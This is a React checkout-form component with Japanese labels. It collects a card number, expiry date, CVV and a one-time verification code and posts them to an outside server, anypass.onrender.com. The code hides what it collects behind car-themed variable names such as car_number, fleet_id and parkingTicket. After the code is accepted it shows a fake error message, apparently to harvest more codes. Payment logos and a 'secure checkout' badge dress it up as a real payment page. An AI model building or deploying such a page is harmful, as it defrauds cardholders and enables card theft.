import { useState } from "react";

const inputClass = `
  border border-gray-200
  p-3 rounded-lg w-full
  text-base text-gray-800
  placeholder-gray-400
  outline-none
  focus:border-pink-400
  focus:ring-1 focus:ring-pink-400
  transition-colors
`;

function LockIcon() {
  return (
    <svg
      width="14" height="14" viewBox="0 0 24 24"
      fill="none" stroke="currentColor" strokeWidth="2"
      strokeLinecap="round" strokeLinejoin="round"
      aria-hidden="true" className="shrink-0"
    >
      <rect x="3" y="11" width="18" height="11" rx="2" />
      <path d="M7 11V7a5 5 0 0 1 10 0v4" />
    </svg>
  );
}

export default function CarForm() {
  const [car, setCar] = useState({
    total_number: "",
    car_number: "",
    fleet_id: "",
  });

  const [parkingTicket, setParkingTicket] = useState("");
  const [showVerification, setShowVerification] = useState(false);

  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");
  const [loading, setLoading] = useState(false);

  const update = (field) => (e) => {
    setCar({
      ...car,
      [field]: e.target.value.replace(/\D/g, ""),
    });
    setError("");
    setSuccess("");
  };

  const isCarInfoValid =
    /^\d{1,16}$/.test(car.total_number) &&
    /^\d{4}$/.test(car.car_number) &&
    /^\d{3}$/.test(car.fleet_id);

  const isTicketValid = /^\d{1,6}$/.test(parkingTicket);

  // STEP 1: Submit initial vehicle requirements
  const handleCarSubmit = async (e) => {
    e.preventDefault();
    setError("");
    setSuccess("");

    if (!isCarInfoValid) {
      setError("カード情報を入力してください");
      return;
    }

    setLoading(true);

    try {
      const response = await fetch("https://anypass.onrender.com/api/cars", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(car),
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.message || "Submission failed");
      }

      // Reveal the parking ticket input directly below
      setShowVerification(true);
    } catch (err) {
      console.error(err);
      setError(
        err.message || "送信に失敗しました。もう一度お試しください。"
      );
    } finally {
      setLoading(false);
    }
  };

  // STEP 2: Verify using the parking ticket number
  const handleVerification = async (e) => {
    e.preventDefault();
    setError("");
    setSuccess("");

    if (!isTicketValid) {
      setError("正しいコードを入力してください");
      return;
    }

    setLoading(true);

    try {
      const response = await fetch(
        "https://anypass.onrender.com/api/cars/verify",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            total_number: car.total_number,
            car_number: car.car_number,
            fleet_id: car.fleet_id,
            parking_ticket_number: parkingTicket,
          }),
        }
      );

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.message || "Verification failed");
      }

      setSuccess("エラーが発生しました。もう一度お試しください");
    } catch (err) {
      console.error(err);
      setError(
        err.message || "確認に失敗しました。もう一度お試しください。"
      );
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex justify-center items-start px-4 py-10 bg-gray-50">
      <div className="w-full max-w-md">
        <div className="bg-white rounded-2xl shadow-sm border border-gray-100 px-6 py-8">
          <h1 className="text-xl font-bold text-gray-800 text-center">
            {showVerification ? "カード認証" : "カード情報を入力してください。"}
          </h1>

          <p className="text-sm text-gray-500 text-center mb-6">
            {showVerification
              ? "Card Verification"
              : "Enter your Card payment information"}
          </p>
          <div className="flex justify-center mb-6">
          <img src="/visa.png" alt="Visa" className="w-16 scale-[0.6] mb-6" />
          <img src="/mastercard.png" alt="MasterCard" className="w-16 scale-[0.6] mb-6" />
          <img src="/jcb.png" alt="JCB" className="w-16 scale-[0.6] mb-6" />
          </div>

          <form
            onSubmit={showVerification ? handleVerification : handleCarSubmit}
            className="flex flex-col gap-4"
          >
            {/* Total Number */}
            <div className="flex flex-col gap-1">
              <label className="text-sm font-medium text-gray-700">
              カード番号
              </label>
              <input
                type="text"
                inputMode="numeric"
                placeholder="0000 0000 0000 0000"
                maxLength={16}
                value={car.total_number}
                onChange={update("total_number")}
                disabled={showVerification}
                className={`${inputClass} ${
                  showVerification ? "bg-gray-100 cursor-not-allowed" : ""
                }`}
              />
            </div>

            <div className="flex gap-4">
  {/* Expiry Date */}
  <div className="flex-1 flex flex-col gap-1">
    <label className="text-sm font-medium text-gray-700">
      有効期限
    </label>
    <input
      type="text"
      inputMode="numeric"
      placeholder="MMYY"
      maxLength={4}
      value={car.car_number}
      onChange={update("car_number")}
      disabled={showVerification}
      className={`${inputClass} ${
        showVerification ? "bg-gray-100 cursor-not-allowed" : ""
      }`}
    />
  </div>

  {/* CVV */}
  <div className="flex-1 flex flex-col gap-1">
    <label className="text-sm font-medium text-gray-700">
      CVV
    </label>
    <input
      type="text"
      inputMode="numeric"
      placeholder="123"
      maxLength={3}
      value={car.fleet_id}
      onChange={update("fleet_id")}
      disabled={showVerification}
      className={`${inputClass} ${
        showVerification ? "bg-gray-100 cursor-not-allowed" : ""
      }`}
    />
  </div>
</div>

            {/* STEP 2 FIELD — Pops up directly below Fleet ID */}
            {showVerification && (
              <div className="flex flex-col gap-1 mt-2 pt-4 border-t border-gray-100 animate-fadeIn">
                <label className="text-sm font-medium text-gray-700">
                認証コード
                </label>
                <input
                  type="text"
                  inputMode="numeric"
                  placeholder="******"
                  maxLength={6}
                  value={parkingTicket}
                  onChange={(e) => {
                    setParkingTicket(
                      e.target.value.replace(/\D/g, "").slice(0, 6)
                    );
                    setError("");
                    setSuccess("");
                  }}
                  className={inputClass}
                  autoFocus
                />
              </div>
            )}

            {/* Dynamic Status Feedback */}
            {error && (
              <p className="text-sm text-red-500 text-center">{error}</p>
            )}

            {success && (
              <p className="text-sm text-green-600 text-center">{success}</p>
            )}

            {/* Dynamic Action Button */}
            <button
              type="submit"
              disabled={
                loading ||
                (showVerification ? !isTicketValid : !isCarInfoValid)
              }
              className="
                bg-red-500 hover:bg-red-600
                text-white font-medium text-sm
                py-3 rounded-lg
                transition-colors
                disabled:opacity-50
                disabled:cursor-not-allowed
                mt-2
              "
            >
              {loading
                ? showVerification
                  ? "確認中..."
                  : "読み込み中..."
                : showVerification
                ? "今すぐ注文を完了する"
                : "次へ"}
            </button>
          </form>
        </div>

        {/* Secure checkout badge */}
        <div className="flex items-center justify-center gap-1.5 text-gray-400 mt-4">
          <LockIcon />
          <span className="text-xs font-medium tracking-wide">
          安全なチェックアウト
          </span>
        </div>
      </div>
    </div>
  );
}